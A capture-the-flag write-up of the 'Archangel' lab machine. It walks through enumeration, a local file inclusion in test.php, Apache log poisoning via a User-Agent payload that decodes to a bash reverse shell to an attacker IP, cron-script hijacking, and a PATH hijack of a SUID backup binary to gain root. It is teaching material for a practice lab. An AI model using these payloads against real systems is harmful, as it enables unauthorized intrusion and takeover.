# Archangel

## Boot2root, Web exploitation, Privilege escalation, LFI
```
Machine's IP: 10.10.185.229
``` 

**NMAP**

Firstly, once the machine is up we can begin with an active enumeration using nmap
```bash
# Nmap 7.95 scan initiated Fri Oct 17 04:19:27 2025 as: /usr/lib/nmap/nmap --privileged -A -oN nmap.txt -T4 -Pn -p- 10.10.185.229
Nmap scan report for 10.10.185.229
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   43.35 ms 10.9.0.1
2   42.64 ms 10.10.185.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 17 04:20:13 2025 -- 1 IP address (1 host up) scanned in 46.13 seconds
```
We can notice 2 services:
- Openssh 7.6p1 is too recent to be vulnerable
- Appache httpd 2.4.29 same as ssh

We will need credentials to use ssh so we will look at the web service

**GOBUSTER**

We will try to find any hidden directories first as the webpage is full of empty links unexploitable
```bash
gobuster dir -u http://10.10.185.229/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t40
```
-> nothing except a rickroll... :)

**HOSTNAME**

We can find in the webpage an email that has as hostname *mafialive.thm*
We can now edit our /etc/hosts such as
```
10.10.185.229   mafialive.com
```

**SECOND WEBPAGE**

Now we can access to a dev webpage where i first want to start a gobuster
```bash
gobuster dir -u http://mafialive.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t40
```
No interesting directories sadly...
I will try the same but with extensions appending
```bash
gobuster dir -u http://mafialive.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t40
```
We now find 2 pages, *index.html* which is the default webpage and *test.php*
Accessing to text.php let us click on a button that displays some text

The most interesting part is that the url changes to *http://mafialive.thm/test.php?view=/var/www/html/development_testing/(file)*

That makes us think about an LFI (local file inclusion)

Let's try some LFIs:
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/../../../../etc/passwd
```
- path traversal is blocked
- url encoding is blocked
- utf-8 encoding is blocked too

Let's just read the php file to see which LFI we can do:
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
Then just base64 decode it and we can read it :)

The code seems to be checking if there are no "../" and if there is "/var/www/html/development_testing/" in the link so we can do our path traversal from development_testing with ..// as linux handle ../ and ..// the same way

**RCE**

Under Apache we can do some Apache log poisoning to get a reverse shell, let's first read the access.log with
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```
(I had some issues being unable to display it but rebooting the machine worked)

Now let's inject a payload in the user agent with a bash reverse shell encoded in b64:
```bash
curl http://mafialive.thm/ -A "<?php system('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuNC4xNzYvOTAwNSAwPiYx | base64 -d | bash');?>"
```
```bash
girsh listen -p 9005
```
I use girsh to get a stabilized reverse shell immediatly

**REVERSE SHELL ACQUIERED**

we are www-data but there is a crontab running each minutes that exec /opt/helloworld.sh as archangel (user) by having a look to **crontab -l**

We can edit it as we have the permissions so let's give us a reverse shell as archangel by replacing the whole file with a bash reverse shell

**PRIVESC**

THEN we can access to /home/archangel/secret now which was blocked before

We find a binary called *./backup* so we will use strings to check what the bin is doing

- the bin sets its perms to root
- use the "cp" command to copy files from a directory that doesnt even exist

We'll create a "cp" bin in /tmp that just do 
```bash
#!/bin/bash
bash -p
```

The file backup will execute our file as root, now we now need to polute the path
```bash
export PATH=/tmp:$PATH
```
We are putting our cp file before the /bin folder so the backup bin will execute our bin as root 

Now we can do 
```bash
./backup 
```
Et voila

We are root

Redacted by Lucas Bouet